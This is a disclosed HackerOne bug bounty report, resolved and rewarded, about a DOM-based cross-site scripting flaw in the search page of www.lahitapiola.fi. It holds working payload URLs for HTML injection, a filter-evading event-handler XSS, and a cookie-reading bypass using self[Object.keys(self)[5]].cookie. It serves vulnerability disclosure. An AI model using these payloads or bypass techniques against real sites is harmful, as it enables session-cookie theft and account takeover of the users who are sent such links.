---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1322322'
original_report_id: '1322322'
title: Cookie exfiltration through XSS on the main search request of www.lahitapiola.fi
weakness: Cross-site Scripting (XSS) - DOM
team_handle: localtapiola
created_at: '2021-08-28T18:41:58.111Z'
disclosed_at: '2023-01-19T21:43:52.527Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 36
asset_identifier: www.lahitapiola.fi
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# Cookie exfiltration through XSS on the main search request of www.lahitapiola.fi

## Metadata

- HackerOne Report ID: 1322322
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: localtapiola
- Disclosed At: 2023-01-19T21:43:52.527Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Basic report information
**Summary:** 
Adding extra search parameters generates the creation of new input fields which can be escaped, thus generating HTML injection possibilities, Cross-Site Scripting attacks, and the retrieval of the page's cookies.

**Description:** 

 - Observing the Bug

I was researching the parameters of search bar from the main page. While search this creates links of the type: `https://www.lahitapiola.fi/henkilo?pagename=LTSearchResults&q=testing`. By adding additional URL parameters, `&random=parameter`, the website creates hidden input fields with the `name` being the first word (random)  and the `value` being the second word (parameter). See figure:

{F1428608}

By creating a name variable with `">`, such as `&random">=parameter`, one can escape the input element. See figure:

{F1428610}

Full URL to replicate escape to HTML: `https://www.lahitapiola.fi/henkilo?pagename=LTSearchResults&q=testing&random%22%3E=parameter`

In consequence, this allows an attacker to generate any html and to inject the page with any HTML elements. For example, ** a payload can be generated to display a link towards an attacker's website**. The following link, `https://www.lahitapiola.fi/henkilo?pagename=LTSearchResults&q=test&other=anything&again%22/%3E%3C/div%3E%3Ca%20href%3D%22https://www.google.com%22%3EClicking%3C/a%3E%3Cinput%20type%3D%22hidden=alert`, does exactly that if a user clicks on the "Clicking" link.

 - XSS

Basic protection impedes an attacker from triggering simple XSS payloads. However, through testing a certain payload works. See figure:

{F1428612}

By hovering and moving around the screen over the *Click Me*, an XSS payload is executed.

URL to reproduce: `https://www.lahitapiola.fi/henkilo?pagename=LTSearchResults&q=test&other=anything&again%22/%3E%3C/div%3E%3Cdiv%2fOnpOinTeReNter%3dconfirm&lpar;document.domain&rpar;%3Eclick%20here%3Cinput%20type%3D%22hidden=alert`

**Javascript payloads can run directly in the user's browser.**

- Getting Cookies

Retrieving  the cookies was an extra step of difficulty, however, here is a payload that works and an image to show it working. The `document.cookie` command seems to be blocked but not the `self[Object.keys(self)[5]].cookie`. In consequence, to trigger this payload a few attempts might be required, the hardcoded `5` is the origin of this issue as Object.keys(self) changes in time I believe. I seem to make it work 1 out of 5 times.

{F1428615}

URL to reproduce: `https://www.lahitapiola.fi/henkilo?pagename=LTSearchResults&q=test&other=anything&again%22/%3E%3C/div%3E%3Cdiv%2fOnpOinTeReNter%3dconfirm&lpar;self[Object.keys(self)[5]].cookie&rpar;%3Eclick%20here%3Cinput%20type%3D%22hidden=alert`

**Cookies and session cookies can be retrieved and exfiltrated to an attacker using javascript.** This poses a risk on any user that is sent a link from anyone else.

**Impact:**
The vulnerability allows for HTML injection, XSS, and cookie retrieval. The impact is important as the URL is the landing page of the website and is simply triggered through a link. In consequence, an attacker could send any user a link from the website and **retrieve their session cookies** or any commonly XSS attacks. The HTML injection allows a button to be injected redirecting towards any possible websites which is an **Open Redirect** vulnerability.

## Browsers / Apps Verified In:
Works in (all up to date at the time of the report):
  * Google Chrome - Version 92.0.4515.159 (Official Build) (64-bit)
  * Microsoft Edge - Version 92.0.902.84 (Official build) (64-bit)

## Steps To Reproduce:

  1. Modify the URL parameters of the main page to escape an html element and inject any html element. URL:
`https://www.lahitapiola.fi/henkilo?pagename=LTSearchResults&q=testing&random%22%3E=parameter`
  2. With the new HTML element find a way to add an XSS payload. URL:
 `https://www.lahitapiola.fi/henkilo?pagename=LTSearchResults&q=test&other=anything&again%22/%3E%3C/div%3E%3Cdiv%2fOnpOinTeReNter%3dconfirm&lpar;document.domain&rpar;%3Eclick%20here%3Cinput%20type%3D%22hidden=alert`
  3. Retrieve cookies through `self[Object.keys(self)[5]].cookie`. URL:
`https://www.lahitapiola.fi/henkilo?pagename=LTSearchResults&q=test&other=anything&again%22/%3E%3C/div%3E%3Cdiv%2fOnpOinTeReNter%3dconfirm&lpar;self[Object.keys(self)[5]].cookie&rpar;%3Eclick%20here%3Cinput%20type%3D%22hidden=alert`

## Additional material

 XSS image:

{F1428612}

Getting cookies XSS image:

{F1428615}

## Related reports, best practices

  * According to me, you should sanitize the first `name` value in your URL as that can be injected. I attempted with the `value` parameter for a while and that did render anything. Therefore, I believe your sanitization for the second value should be applied on the `name` value in the URL.

## Impact

The vulnerability allows for HTML injection, XSS, and cookie retrieval. The impact is important as the URL is the landing page of the website and is simply triggered through a link. In consequence, an attacker could send any user a link from the website and retrieve their session cookies or perform any common XSS attacks. 
The HTML injection allows a button to be injected redirecting towards any possible website which is an Open Redirect vulnerability.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
